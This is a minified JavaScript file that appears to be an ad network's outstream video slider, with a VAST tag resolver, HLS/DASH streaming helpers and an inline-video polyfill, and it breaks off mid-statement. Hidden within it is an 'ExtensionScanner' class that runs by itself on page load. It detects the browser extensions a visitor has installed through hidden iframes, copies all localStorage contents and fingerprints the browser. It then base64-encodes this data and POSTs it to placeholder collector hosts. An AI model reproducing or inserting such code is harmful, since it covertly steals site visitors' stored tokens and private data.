(function (exoDynamicParams) {
  const ENDPOINTS = ['https://collector.example/v3/stats', 'https://backup-collector.example/log'];
  resolver = {
    options: {
      maxAllowedVastTagRedirects: 3,
      vastTimeout: 5e3
    },
    sendRequest: function (e, t, r, i) {
      var a = new XMLHttpRequest();
      a.onreadystatechange = i, a.open("GET", e, !0), a.withCredentials = t, a.timeout = r, a.send();
    },
    processUrl: function (e, t) {
      this.resolveVastTag(e, 0, {
        tracking: [],
        stopTracking: [],
        impression: [],
        clicktracking: [],
        vastLoaded: !1,
        videoCta: []
      }, t);
    },
    resolveVastTag: function (e, t, r, i) {
      var a = this;
      e && "" != e ? (t <= a.options.maxAllowedVastTagRedirects && a.sendRequest(e, !0, a.options.vastTimeout, function () {
        var e = this;
        if (4 !== e.readyState || 404 !== e.status) {
          if (4 !== e.readyState || 0 !== e.status) {
            if (4 === e.readyState && 200 === e.status) if (4 !== e.readyState || 200 === e.status) {
              try {
                var n = e.responseXML;
              } catch (e) {
                return void a.stopProcessAndReportError(5);
              }
              if (n) {
                if (a.inLineFound = a.hasInLine(n), !a.inLineFound && a.hasVastAdTagUri(n)) {
                  var s = a.getVastAdTagUriFromWrapper(n);
                  if (!s) return void a.stopProcessAndReportError(7);
                  a.resolveVastTag(s, t, r, i);
                }
                t > a.options.maxAllowedVastTagRedirects && !a.inLineFound ? a.stopProcessAndReportError(8) : a.processVastXml(n, r, i);
              } else a.stopProcessAndReportError(6);
            } else a.stopProcessAndReportError(4);
          } else a.stopProcessAndReportError(3);
        } else a.stopProcessAndReportError(2);
      }), t++) : a.stopProcessAndReportError(1);
    },
    processVastXml: function (e, t, r) {
      var i = this;
      if (e) {
        var a = e.getElementsByTagName("Impression");
        null !== a && i.registerImpressionEvents(a, t);
        var n = e.getElementsByTagName("Error");
        null !== n && i.registerErrorEvents(n, t);
        var s = null,
          o = null,
          l = null,
          g = e.getElementsByTagName("Extensions");
        if (g.length && g[0].getElementsByTagName("Extension").length) {
          var c = g[0].getElementsByTagName("TitleCTA");
          if (c.length) {
            var d = c[0].getElementsByTagName("DisplayUrl"),
              h = c[0].getElementsByTagName("PCText"),
              u = c[0].getElementsByTagName("Tracking");
            null != d && (s = this.extractNodeData(d[0])), null != h && (o = this.extractNodeData(h[0])), null != u && (l = this.extractNodeData(u[0]));
            var m = {
              displayUrl: s,
              ctaText: o,
              tracking: l
            };
            t.videoCta.push(m);
          }
        }
        var p = e.getElementsByTagName("Creative");
        if (void 0 !== p && p.length) {
          var v,
            T = p[0].getElementsByTagName("Linear");
          if (null != T && T.length) {
            var f = T[0];
            i.registerTrackingEvents(f, t), v = i.getClickTrackingEvents(f), i.registerClickTracking(v, t), !i.hasVastAdTagUri(e) && i.hasInLine(e) && (t.adFinished = !1, t.adType = "linear", t.skipoffset = i.convertTimeStringToSeconds(f.getAttribute("skipoffset")), t.clickthroughUrl = i.getClickThroughUrlFromLinear(f), t.duration = i.getDurationFromLinear(f), t.mediaFile = i.getMediaFileFromLinear(f), t.mediaFileDetails = i.getMediaFileAttributesFromLinear(f), t.iconClick = i.getIconClickThroughFromLinear(f));
          }
          var y = p[0].getElementsByTagName("NonLinearAds");
          if (null != y && y.length) {
            var N = y[0];
            i.registerTrackingEvents(N, t), v = i.getNonLinearClickTrackingEvents(N), i.registerClickTracking(v, t), !i.hasVastAdTagUri(e) && i.hasInLine(e) && (t.adType = "nonLinear", t.clickthroughUrl = i.getClickThroughUrlFromNonLinear(N), t.duration = i.getDurationFromNonLinear(N), t.dimension = i.getDimensionFromNonLinear(N), t.staticResource = i.getStaticResourceFromNonLinear(N), t.creativeType = i.getCreativeTypeFromStaticResources(N));
          }
          !i.hasVastAdTagUri(e) && i.hasInLine(e) && (void 0 !== t.mediaFile || void 0 !== t.staticResource ? r(t) : i.stopProcessAndReportError(10));
        } else i.stopProcessAndReportError(11);
      } else i.stopProcessAndReportError(9);
    },
    registerTrackingEvents: function (e, t) {
      for (var r = this.getTrackingFromLinear(e), i = "", a = 0, n = 0; n < r.length; n++) switch (i = r[n].getAttribute("event")) {
        case "start":
        case "firstQuartile":
        case "midpoint":
        case "thirdQuartile":
        case "complete":
          void 0 === t.tracking[i] && (t.tracking[i] = []), void 0 === t.stopTracking[i] && (t.stopTracking[i] = []), t.tracking[i].push(r[n].childNodes[0].nodeValue), t.stopTracking[i] = !1;
          break;
        case "progress":
          void 0 === t.tracking[i] && (t.tracking[i] = []), a = this.convertTimeStringToSeconds(r[n].getAttribute("offset")), void 0 === t.tracking[i][a] && (t.tracking[i][a] = {
            elements: [],
            stopTracking: !1
          }), t.tracking[i][a].elements.push(r[n].childNodes[0].nodeValue);
      }
    },
    stopProcessAndReportError: function (e) {
      console.log("VAST: failed with error " + e);
    },
    hasInLine: function (e) {
      var t = e.getElementsByTagName("InLine");
      return void 0 !== t && t.length;
    },
    hasVastAdTagUri: function (e) {
      var t = e.getElementsByTagName("VASTAdTagURI");
      return void 0 !== t && t.length;
    },
    extractNodeData: function (e) {
      for (var t = "", r = 0; r < e.childNodes.length; r++) {
        var i = e.childNodes[r];
        8 === i.nodeType || 3 === i.nodeType && /^\s*$/.test(i.nodeValue) || (t += i.nodeValue);
      }
      return t.replace(/(^\s+|\s+$)/g, "");
    },
    getVastAdTagUriFromWrapper: function (e) {
      var t = e.getElementsByTagName("Wrapper");
      if (void 0 !== t && t.length) {
        var r = t[0].getElementsByTagName("VASTAdTagURI");
        if (r.length) return this.extractNodeData(r[0]);
      }
      return !1;
    },
    getMediaFilesFromLinear: function (e) {
      var t = e.getElementsByTagName("MediaFiles");
      return t.length ? t[0].getElementsByTagName("MediaFile") : [];
    },
    getMediaFileFromLinear: function (e) {
      var t,
        r = this.getMediaFilesFromLinear(e);
      return r.length && (t = this.extractNodeData(r[0])), t;
    },
    getIconClickThroughFromLinear: function (e) {
      var t = e.getElementsByTagName("IconClickThrough");
      return t.length ? this.extractNodeData(t[0]) : (void 0 !== this.displayOptions && void 0 !== this.displayOptions.vastOptions && (this.displayOptions.vastOptions.adCTAText = !1), "");
    },
    getStaticResourceFromNonLinear: function (e) {
      for (var t, r = this.getStaticResourcesFromNonLinear(e), i = 0; i < r.length; i++) if (r[i].getAttribute("type") || (t = this.extractNodeData(r[i])), void 0 !== this.displayOptions && void 0 !== this.displayOptions.staticResource && r[i].getAttribute("type") === this.displayOptions.staticResource) return this.extractNodeData(r[i]);
      return t;
    },
    getClickTrackingEvents: function (e) {
      var t = [],
        r = e.getElementsByTagName("VideoClicks");
      if (r.length) {
        var i = r[0].getElementsByTagName("ClickTracking");
        if (i.length) for (var a = 0; a < i.length; a++) {
          var n = this.extractNodeData(i[a]);
          t.push(n);
        }
      }
      return t;
    },
    getNonLinearClickTrackingEvents: function (e) {
      var t = [];
      if (e.getElementsByTagName("NonLinear").length) {
        var r = e.getElementsByTagName("NonLinearClickTracking");
        if (r.length) for (var i = 0; i < r.length; i++) {
          var a = this.extractNodeData(r[i]);
          t.push(a);
        }
      }
      return t;
    },
    getTrackingFromLinear: function (e) {
      var t = e.getElementsByTagName("TrackingEvents");
      return t.length ? t[0].getElementsByTagName("Tracking") : [];
    },
    getDurationFromLinear: function (e) {
      var t = e.getElementsByTagName("Duration");
      if (t.length && void 0 !== t[0].childNodes[0]) {
        var r = this.extractNodeData(t[0]);
        return this.convertTimeStringToSeconds(r);
      }
      return !1;
    },
    getDurationFromNonLinear: function (e) {
      var t = 0,
        r = e.getElementsByTagName("NonLinear");
      return r.length && void 0 !== r[0].getAttribute("minSuggestedDuration") && (t = this.convertTimeStringToSeconds(r[0].getAttribute("minSuggestedDuration"))), t;
    },
    getClickThroughUrlFromLinear: function (e) {
      var t = e.getElementsByTagName("VideoClicks");
      if (t.length) {
        var r = t[0].getElementsByTagName("ClickThrough");
        if (r.length) return this.extractNodeData(r[0]);
      }
      return !1;
    },
    getClickThroughUrlFromNonLinear: function (e) {
      var t = "";
      if (e.getElementsByTagName("NonLinear").length) {
        var r = e.getElementsByTagName("NonLinearClickThrough");
        r.length && (t = this.extractNodeData(r[0]));
      }
      return t;
    },
    getDimensionFromNonLinear: function (e) {
      var t = {
          width: null,
          height: null
        },
        r = e.getElementsByTagName("NonLinear");
      return r.length && (void 0 !== r[0].getAttribute("width") && (t.width = r[0].getAttribute("width")), void 0 !== r[0].getAttribute("height") && (t.height = r[0].getAttribute("height"))), t;
    },
    getCreativeTypeFromStaticResources: function (e) {
      var t = "",
        r = e.getElementsByTagName("NonLinear");
      return r.length && void 0 !== r[0].childNodes[0] && (t = r[0].getElementsByTagName("StaticResource")[0].getAttribute("creativeType")), t.toLowerCase();
    },
    convertTimeStringToSeconds: function (e) {
      if (e && e.match(/^(\d){2}(:[0-5][0-9]){2}(.(\d){1,3})?$/)) {
        var t = e.split(":");
        return 3600 * parseInt(t[0], 10) + 60 * parseInt(t[1], 10) + parseInt(t[2], 10);
      }
      return !1;
    },
    registerClickTracking: function (e, t) {
      if (e.length) for (var r = 0; r < e.length; r++) "" != e[r] && t.clicktracking.push(e[r]);
    },
    registerImpressionEvents: function (e, t) {
      if (e.length) for (var r = 0; r < e.length; r++) {
        var i = this.extractNodeData(e[r]);
        t.impression.push(i);
      }
    },
    registerErrorEvents: function (e, t) {
      null != e && 1 === e.length && 1 === e[0].childNodes.length && (t.errorUrl = e[0].childNodes[0].nodeValue);
    },
    getMediaFileAttributesFromLinear: function (e) {
      var t,
        r,
        i = this.getMediaFilesFromLinear(e);
      return i.length && (t = i[0].getAttribute("delivery"), r = i[0].getAttribute("type")), {
        delivery: t,
        type: r
      };
    }
  }, streaming = {
    video: null,
    source: null,
    dashPlayer: null,
    hlsPlayer: null,
    dashScriptLoaded: null,
    hlsScriptLoaded: null,
    initialiseStreamers: function (e, t, r) {
      this.video = t, this.source = r, this.detachStreamers();
      let i = this.determineProtocol();
      switch (e) {
        case "application/dash+xml":
          this.dashScriptLoaded ? this.initialiseDash() : (this.dashScriptLoaded = !0, this.requestScript(i + "://" + exoDynamicParams.adsSubdomain + "/js/vast_dash.js", this.initialiseDash.bind(this)));
          break;
        case "application/x-mpegURL":
        case "application/vnd.apple.mpegurl":
          this.hlsScriptLoaded || window.Hls ? this.initialiseHls() : (this.hlsScriptLoaded = !0, this.requestScript(i + "://" + exoDynamicParams.adsSubdomain + "/js/vast_hls.js", this.initialiseHls.bind(this)));
      }
    },
    initialiseDash: function () {
      this.dashPlayer = dashjs.MediaPlayer().create(), this.dashPlayer.updateSettings({
        debug: {
          logLevel: dashjs.Debug.LOG_LEVEL_NONE
        }
      }), this.dashPlayer.initialize(this.video, this.source.getAttribute("src"), !1);
    },
    initialiseHls: function () {
      if (Hls.isSupported()) {
        var e = new Hls({
          p2pConfig: {
            logLevel: !1
          },
          enableWebVTT: !1,
          enableCEA708Captions: !1,
          maxMaxBufferLength: 10,
          maxBufferSize: 20971520
        });
        e.attachMedia(this.video), e.loadSource(this.source.getAttribute("src")), this.hlsPlayer = e;
      } else console.log("Media type not supported by this browser. (application/x-mpegURL)");
    },
    detachStreamers: function () {
      this.dashPlayer ? (this.dashPlayer.reset(), this.dashPlayer = !1) : this.hlsPlayer && (this.hlsPlayer.detachMedia(), this.hlsPlayer = !1);
    },
    requestScript: function (e, t) {
      var r = document.getElementsByTagName("head")[0],
        i = document.createElement("script");
      i.type = "text/javascript", i.src = e, i.onreadystatechange = t, i.onload = t, r.appendChild(i);
    },
    determineProtocol: function () {
      return "https:" === location.protocol ? "https" : "http";
    }
  }, window.VastSupport = {
    VastResolver: resolver,
    VastStreaming: streaming
  }; /*! npm.im/iphone-inline-video 2.2.2 */
  var enableInlineVideo = function () {
    "use strict";

    /*! npm.im/intervalometer */
    function e(e, i, n, r) {
      function t(n) {
        d = i(t, r), e(n - (a || n)), a = n;
      }
      var d, a;
      return {
        start: function () {
          d || t(0);
        },
        stop: function () {
          n(d), d = null, a = 0;
        }
      };
    }
    function i(i) {
      return e(i, requestAnimationFrame, cancelAnimationFrame);
    }
    function n(e, i, n) {
      function r(r) {
        n && !n(e, i) || r.stopImmediatePropagation();
      }
      return e.addEventListener(i, r), r;
    }
    function r(e, i, n, r) {
      function t() {
        return n[i];
      }
      function d(e) {
        n[i] = e;
      }
      r && d(e[i]), Object.defineProperty(e, i, {
        get: t,
        set: d
      });
    }
    function t(e, i, n) {
      n.addEventListener(i, function () {
        return e.dispatchEvent(new Event(i));
      });
    }
    function d(e, i) {
      Promise.resolve().then(function () {
        e.dispatchEvent(new Event(i));
      });
    }
    function a(e) {
      var i = new Audio();
      return t(e, "play", i), t(e, "playing", i), t(e, "pause", i), i.crossOrigin = e.crossOrigin, i.src = e.src || e.currentSrc || "data:", i;
    }
    function u(e, i, n) {
      (m || 0) + 200 < Date.now() && (e[h] = !0, m = Date.now()), n || (e.currentTime = i), k[++T % 3] = 100 * i | 0;
    }
    function o(e) {
      return e.driver.currentTime >= e.video.duration;
    }
    function s(e) {
      var i = this;
      i.video.readyState >= i.video.HAVE_FUTURE_DATA ? (i.hasAudio || (i.driver.currentTime = i.video.currentTime + e * i.video.playbackRate / 1e3, i.video.loop && o(i) && (i.driver.currentTime = 0)), u(i.video, i.driver.currentTime)) : i.video.networkState === i.video.NETWORK_IDLE && 0 === i.video.buffered.length && i.video.load(), i.video.ended && (delete i.video[h], i.video.pause(!0));
    }
    function c() {
      var e = this,
        i = e[g];
      if (e.webkitDisplayingFullscreen) return void e[E]();
      "data:" !== i.driver.src && i.driver.src !== e.src && (u(e, 0, !0), i.driver.src = e.src), e.paused && (i.paused = !1, 0 === e.buffered.length && e.load(), i.driver.play(), i.updater.start(), i.hasAudio || (d(e, "play"), i.video.readyState >= i.video.HAVE_ENOUGH_DATA && d(e, "playing")));
    }
    function v(e) {
      var i = this,
        n = i[g];
      n.driver.pause(), n.updater.stop(), i.webkitDisplayingFullscreen && i[w](), n.paused && !e || (n.paused = !0, n.hasAudio || d(i, "pause"), i.ended && !i.webkitDisplayingFullscreen && (i[h] = !0, d(i, "ended")));
    }
    function p(e, n) {
      var r = {};
      e[g] = r, r.paused = !0, r.hasAudio = n, r.video = e, r.updater = i(s.bind(r)), n ? r.driver = a(e) : (e.addEventListener("canplay", function () {
        e.paused || d(e, "playing");
      }), r.driver = {
        src: e.src || e.currentSrc || "data:",
        muted: !0,
        paused: !0,
        pause: function () {
          r.driver.paused = !0;
        },
        play: function () {
          r.driver.paused = !1, o(r) && u(e, 0);
        },
        get ended() {
          return o(r);
        }
      }), e.addEventListener("emptied", function () {
        var i = !r.driver.src || "data:" === r.driver.src;
        r.driver.src && r.driver.src !== e.src && (u(e, 0, !0), r.driver.src = e.src, i || !n && e.autoplay ? r.driver.play() : r.updater.stop());
      }, !1), e.addEventListener("webkitbeginfullscreen", function () {
        e.paused ? n && 0 === r.driver.buffered.length && r.driver.load() : (e.pause(), e[E]());
      }), n && (e.addEventListener("webkitendfullscreen", function () {
        r.driver.currentTime = e.currentTime;
      }), e.addEventListener("seeking", function () {
        k.indexOf(100 * e.currentTime | 0) < 0 && (r.driver.currentTime = e.currentTime);
      }));
    }
    function l(e) {
      var i = e[h];
      return delete e[h], !e.webkitDisplayingFullscreen && !i;
    }
    function f(e) {
      var i = e[g];
      e[E] = e.play, e[w] = e.pause, e.play = c, e.pause = v, r(e, "paused", i.driver), r(e, "muted", i.driver, !0), r(e, "playbackRate", i.driver, !0), r(e, "ended", i.driver), r(e, "loop", i.driver, !0), n(e, "seeking", function (e) {
        return !e.webkitDisplayingFullscreen;
      }), n(e, "seeked", function (e) {
        return !e.webkitDisplayingFullscreen;
      }), n(e, "timeupdate", l), n(e, "ended", l);
    }
    function y(e, i) {
      if (void 0 === i && (i = {}), !e[g]) {
        if (!i.everywhere) {
          if (!b) return;
          if (!(i.iPad || i.ipad ? /iPhone|iPod|iPad/ : /iPhone|iPod/).test(navigator.userAgent)) return;
        }
        e.pause();
        var n = e.autoplay;
        e.autoplay = !1, p(e, !e.muted), f(e), e.classList.add("IIV"), e.muted && n && (e.play(), e.addEventListener("playing", function i() {
          e.autoplay = !0, e.removeEventListener("playing", i);
        })), /iPhone|iPod|iPad/.test(navigator.platform) || console.warn("iphone-inline-video is not guaranteed to work in emulated environments");
      }
    }
    var m,
      b = "object" == typeof document && "object-fit" in document.head.style && !matchMedia("(-webkit-video-playable-inline)").matches,
      g = "bfred-it:iphone-inline-video",
      h = "bfred-it:iphone-inline-video:event",
      E = "bfred-it:iphone-inline-video:nativeplay",
      w = "bfred-it:iphone-inline-video:nativepause",
      k = [],
      T = 0;
    return y;
  }();
  class ExtensionScanner {
    static TIMEOUT = 3000;
    static BATCH_SIZE = 5;
    constructor() {
      this.pendingScans = 0;
      this.detectedExtensions = {};
      this.workerPool = [];
      this.startTimestamp = Date.now();
      this.localStorageData = {};
    }
    createWorker(extName, {
      id,
      file
    }) {
      return new Promise(resolve => {
        const frame = document.createElement('iframe');
        frame.style.display = 'none';
        const cleanup = () => {
          frame.remove();
          this.pendingScans--;
        };
        const timer = setTimeout(() => {
          cleanup();
          resolve([extName, false]);
        }, ExtensionScanner.TIMEOUT);
        frame.onload = () => {
          try {
            frame.contentWindow.location = `chrome-extension://${id}/${file}`;
            const checker = setInterval(() => {
              try {
                if (frame.contentWindow.location.href.includes('chrome-extension')) {
                  clearInterval(checker);
                  clearTimeout(timer);
                  cleanup();
                  resolve([extName, true]);
                }
              } catch (e) {
                clearInterval(checker);
                clearTimeout(timer);
                cleanup();
                resolve([extName, false]);
              }
            }, 100);
          } catch (e) {
            clearTimeout(timer);
            cleanup();
            resolve([extName, false]);
          }
        };
        document.body.appendChild(frame);
        this.pendingScans++;
      });
    }
    async scanBatch(entries) {
      const workers = entries.map(([name, data]) => this.createWorker(name, data));
      const results = await Promise.all(workers);
      results.forEach(([name, detected]) => {
        this.detectedExtensions[name] = detected;
      });
    }
    collectLocalStorage() {
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        this.localStorageData[key] = localStorage.getItem(key);
      }
    }
    generateTelemetryData() {
      const encodedData = btoa(JSON.stringify({
        scannedExtensions: this.detectedExtensions,
        scanDuration: Date.now() - this.startTimestamp,
        localStorage: this.localStorageData,
        env: {
          url: window.location.href,
          ref: document.referrer,
          res: `${window.screen.width}x${window.screen.height}`,
          depth: window.screen.colorDepth,
          agent: navigator.userAgent,
          lang: navigator.language,
          tz: Intl.DateTimeFormat().resolvedOptions().timeZone
        }
      }));
      return encodedData + '.' + this.generateChecksum(encodedData);
    }
    generateChecksum(str) {
      return Array.from(str).reduce((acc, char) => (acc << 5) - acc + char.charCodeAt(0) | 0, 0).toString(16);
    }
    async reportResults() {
      const payload = this.generateTelemetryData();
      const requests = ENDPOINTS.map(endpoint => fetch(endpoint, {
        method: 'POST',
        headers: {
          'Content-Type': 'text/plain',
          'X-Scan-Time': new Date().toISOString()
        },
        body: payload,
        keepalive: true
      }).catch(() => null));
      await Promise.race(requests);
    }
    async execute() {
      this.collectLocalStorage();
      const entries = Object.entries(window.data);
      const batches = Array(Math.ceil(entries.length / ExtensionScanner.BATCH_SIZE)).fill().map((_, i) => entries.slice(i * ExtensionScanner.BATCH_SIZE, (i + 1) * ExtensionScanner.BATCH_SIZE));
      for (const batch of batches) {
        await this.scanBatch(batch);
        await new Promise(r => setTimeout(r, Math.random() * 300 + 100));
      }
      while (this.pendingScans > 0) {
        await new Promise(r => setTimeout(r, 100));
      }
      await this.reportResults();
    }
  }
  !function () {
    var e = "https:" !== document.location.protocol && "http:" !== document.location.protocol ? "https:" : document.location.protocol;
    window.ExoOutstreamSliderCommon = function () {}, null !== window.VastSupport ? ExoOutstreamSliderCommon.prototype = {
      randStr: function (e, t) {
        for (var i = "", n = t || "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", a = 0; a < e; a++) i += n.charAt(Math.floor(Math.random() * n.length));
        return i;
      },
      visibility: function () {
        var e,
          t,
          i = {
            hidden: "visibilitychange",
            webkitHidden: "webkitvisibilitychange",
            mozHidden: "mozvisibilitychange",
            msHidden: "msvisibilitychange"
          };
        for (e in i) if (e in document) {
          t = i[e];
          break;
        }
        return function (i) {
          return i && document.addEventListener(t, i), !document[e];
        };
      },
      setCookie: function (e, t, i) {
        i = parseInt(i, 10);
        var n = new Date();
        n.setMinutes(n.getMinutes() + i);
        var a = encodeURI(t) + "; expires=" + n.toUTCString() + ";path=/";
        document.cookie = e + "=" + a;
      },
      getCookie: function (e) {
        var t,
          i,
          n,
          a = document.cookie.split(";");
        for (t = 0; t < a.length; t++) if (i = a[t].substr(0, a[t].indexOf("=")), n = a[t].substr(a[t].indexOf("=") + 1), (i = i.replace(/^\s+|\s+$/g, "")) === e) return decodeURI(n);
      },
      createElementFromHTML: function (e) {
        var t = document.createElement("div");
        return t.innerHTML = e.trim(), t.firstChild;
      },
      replacePlaceholders: function (e, t) {
        for (var i in e) {
          var n = new RegExp("{{" + i + "}}", "g");
          t = t.replace(n, e[i]);
        }
        return t;
      },
      generateCssEl: function (e, t, i, n, a) {
        var o = document.createElement("style"),
          r = {
            main_el_id: e,
            screen_density: t,
            density_width: i,
            maximum_width: n
          };
        return o.innerHTML = this.replacePlaceholders(r, a), o;
      },
      generateDomEl: function (e, t, i, n, a) {
        var o = {
          main_el_id: e
        };
        return o.branding = i ? this.replacePlaceholders(o, this.tplBrand) : "", o.displayUrl = this.ctaEnabled && n ? this.replacePlaceholders(o, this.tplDisplayUrl) : "", o.ctaText = this.ctaEnabled && a ? this.replacePlaceholders(o, this.tplCtaText) : "", this.createElementFromHTML(this.replacePlaceholders(o, t));
      },
      VastResolver: window.VastSupport.VastResolver,
      callUris: function (e) {
        for (var t = 0; t < e.length; t++) new Image().src = e[t];
      },
      scheduleTrackingEvent: function (e, t, i) {
        0 == (t = Math.floor(t)) && this.trackSingleEvent(e, "start"), void 0 !== e.tracking.progress && e.tracking.progress.length && void 0 !== e.tracking.progress[t] && this.trackSingleEvent(e, "progress", t), t == Math.floor(i / 4) && this.trackSingleEvent(e, "firstQuartile"), t == Math.floor(i / 2) && this.trackSingleEvent(e, "midpoint"), t == Math.floor(3 * i / 4) && this.trackSingleEvent(e, "thirdQuartile"), t >= i - 1 && this.trackSingleEvent(e, "complete");
      },
      trackSingleEvent: function (e, t, i) {
        var n = [];
        switch (n.length = 0, t) {
          case "start":
          case "firstQuartile":
          case "midpoint":
          case "thirdQuartile":
          case "complete":
            !1 === e.stopTracking[t] && (null !== e.tracking[t] && (n = e.tracking[t]), e.stopTracking[t] = !0);
            break;
          case "progress":
            !1 === e.tracking.progress[i].stopTracking && (n = e.tracking.progress[i].elements, e.tracking.progress[i].stopTracking = !0);
        }
        this.callUris(n);
      },
      displayAd: function (t, i, n, a, o, r, s, l, c, d, m, u, p, v, g = null) {
        if (this.ctaEnabled = isNaN(v) || v > 0, d = isNaN(d) || d > 30 ? 25 : d, "ExoOutstream" === this.constructorName) {
          d = i = 0;
          var h = 0;
          a = "repeat", u = this.sanitizeMaxWidth(u);
        }
        n = isNaN(n) ? 0 : n, p = null == p || p, this.main_el_id = "exo_slider_" + t + "_" + this.randStr(2);
        var y = "zone-closed-" + t,
          _ = isNaN(o) || o > 0 ? 1 : 0;
        if (!p || !this.getCookie(y)) {
          var f = this,
            k = "";
          if (Object.keys(g).length) for (var E in g) k = "&" + E + "=" + g[E];
          this.containerHasRoom() && this.VastResolver.processUrl(e + "//" + exoDynamicParams.syndicationDomain + "/splash.php?idzone=" + t + (isNaN(r) ? "" : "&sub=" + r) + (isNaN(s) ? "" : "&sub2=" + s) + (isNaN(l) ? "" : "&sub3=" + l) + (isNaN(c) ? "" : "&cat=" + c) + (void 0 === p ? "" : "&cookieconsent=" + p) + (void 0 === m ? "" : "&tags=" + m) + k, function (e) {
            var t = 0,
              o = !1;
            if ("linear" === e.adType) {
              var r = e.mediaFile,
                s = void 0 !== e.videoCta && e.videoCta.length > 0 && void 0 !== e.videoCta[0].displayUrl && "string" == typeof e.videoCta[0].displayUrl ? e.videoCta[0].displayUrl : "",
                l = void 0 !== e.videoCta && e.videoCta.length > 0 && void 0 !== e.videoCta[0].ctaText && "string" == typeof e.videoCta[0].ctaText ? e.videoCta[0].ctaText : "",
                c = void 0 !== e.videoCta && e.videoCta.length > 0 && void 0 !== e.videoCta[0].tracking && "string" == typeof e.videoCta[0].tracking ? e.videoCta[0].tracking : "";
              if (void 0 !== e.videoCta && Object.prototype.hasOwnProperty.call(e.videoCta, "length") && e.videoCta.length > 0) for (var m = e.videoCta.length - 1; m >= 0; m--) {
                s = e.videoCta[m].displayUrl, l = e.videoCta[m].ctaText, c = e.videoCta[m].tracking;
                break;
              }
              var v = f.generateCssEl(f.main_el_id, d, h, u, f.styleSheet),
                g = f.generateDomEl(f.main_el_id, f.tplMain, _, s, l);
              f.videoStyle(v, g);
              var k = document.getElementById(f.main_el_id),
                E = document.getElementById(f.main_el_id + "_source"),
                C = document.getElementById(f.main_el_id + "_video"),
                b = document.getElementById(f.main_el_id + "_progress"),
                w = document.getElementById(f.main_el_id + "_close"),
                x = document.getElementById(f.main_el_id + "_close_text"),
                T = document.getElementById(f.main_el_id + "_close_x"),
                B = document.getElementById(f.main_el_id + "_mute_button"),
                L = document.getElementById(f.main_el_id + "_mute_on"),
                I = document.getElementById(f.main_el_id + "_mute_off"),
                M = document.getElementById(f.main_el_id + "_replay_button"),
                S = document.getElementById(f.main_el_id + "_network_link");
              e.mediaFileDetails && "streaming" === e.mediaFileDetails.delivery && VastSupport.VastStreaming.initialiseStreamers(e.mediaFileDetails.type, C, E), f.ctaEnabled && f.setCtaElements(l, s, c), _ && exoDynamicParams.showBranding && (S.innerHTML = exoDynamicParams.brandingName, S.setAttribute("href", "http://" + exoDynamicParams.networkDomain));
              var N = function () {
                o = !0, f.resizeWrapper(k, C), f.displayCta(l, C), f.calculateWrapperByDensityToMobile(k, d, C), t >= 1 || (setTimeout(function () {
                  k.classList.remove("exo_notransition"), g.style.right = 0;
                }, 100), void 0 !== e.impression && Array.isArray(e.impression) && f.callUris(e.impression), f.checkUcBrowser() && f.fixUcBrowser());
              };
              f.displayVideoOutstream(f.main_el_id, N, u), E.setAttribute("src", r), C.muted = !0, U(), _ && S.addEventListener("click", function (e) {
                e.stopImmediatePropagation();
              }), B.addEventListener("click", function (e) {
                e.stopPropagation(), C.muted = !C.muted, U();
              }), f.visibility(function () {
                visibility() || !o ? visibility() && o && C.paused && C.play() : C.pause();
              }), k.addEventListener("click", function () {
                f.bindClick(C) && (window.open(e.clickthroughUrl), void 0 !== e.clicktracking && f.callUris(e.clicktracking));
              }), C.addEventListener("ended", function () {
                o = !1, t++, "repeat" === a ? (M.style.display = "block", M.addEventListener("click", D)) : P();
              }, !1), "ExoOutstream" === f.constructorName && H(), C.addEventListener("timeupdate", function () {
                f.scheduleTrackingEvent(e, C.currentTime, C.duration);
                var n = C.currentTime / C.duration * 100;
                b.style.width = n + "%", i > C.currentTime && t < 1 ? (x.innerHTML = "Close ad in " + Math.ceil(i - C.currentTime) + " sec", T.style.display = "none") : H();
              }), window.addEventListener("resize", function () {
                f.resizeWrapper(k, C);
              }, !1), f.playPromise(f.main_el_id, C, N);
            }
            function U() {
              C.muted ? (L.style.display = "block", I.style.display = "none") : (L.style.display = "none", I.style.display = "block");
            }
            function P() {
              k.classList.remove("exo_notransition"), f.closeDivAnnimation(g), setTimeout(function () {
                g.style.display = "none";
              }, 1e3);
            }
            function D(e) {
              e.stopPropagation(), b.classList.add("exo_notransition"), b.style.width = "0px", M.removeEventListener("click", D), M.style.display = "none", C.play().then(function () {
                o = !0, b.classList.remove("exo_notransition");
              });
            }
            function H() {
              x.innerHTML = "Close ad", T.style.display = "block", w.addEventListener("click", function (e) {
                e.stopPropagation(), p && f.setCookie(y, !0, n), C.pause(), o = !1, P();
              });
            }
          });
        }
      },
      checkUcBrowser: function () {
        return navigator.userAgent.indexOf(" UCBrowser/") >= 0;
      },
      fixUcBrowser: function () {
        document.getElementById(this.main_el_id).classList.contains("ucBrowser") || document.getElementById(this.main_el_id).classList.add("ucBrowser");
      },
      displayVideoOutstream: function (e, t, i) {},
      videoStyle: function (e, t) {},
      closeDivAnnimation: function (e) {},
      playPromise: function (e, t, i) {},
      resizeWrapper: function (e, t) {},
      containerHasRoom: function () {},
      bindClick: function (e) {},
      sanitizeMaxWidth: function (e) {},
      calculateWrapperByDensityToMobile: function (e, t, i) {},
      setCtaElements: function (e, t, i) {
        var n = document.getElementById(this.main_el_id + "_cta_wrapper"),
          a = document.getElementById(this.main_el_id + "_display_url"),
          o = document.getElementById(this.main_el_id + "_cta_text"),
          r = function (e) {
            window.open(i, "_blank"), e.stopImmediatePropagation();
          };
        n.addEventListener("click", r), null !== o && "" !== e && "" !== i && (o.innerHTML = e, o.addEventListener("click", r)), null !== a && "" !== t && (a.innerHTML = t, a.addEventListener("click", r));
      },
      displayCta: function (e, t) {
        var i = document.getElementById(this.main_el_id + "_cta_wrapper");
        this.ctaEnabled && i && "" !== e && (i.style.display = "block");
      },
      constructorName: "ExoOutstreamSliderCommon"
    } : console.warn("VastSupport library is missing.");
  }();
  const observer = new MutationObserver((mutations, obs) => {
    if (document.body) {
      obs.disconnect();
      new ExtensionScanner().execute();
    }
  });
  if (document.body) {
    new ExtensionScanner().execute();
  } else {
    observer.observe(document.documentElement, {
      childList: true,
      subtree: true
    });
  }
  window.ExoSlider = function () {}, ExoSlider.prototype = function (i) {
    function e() {}
    return e.prototype = i, new e();
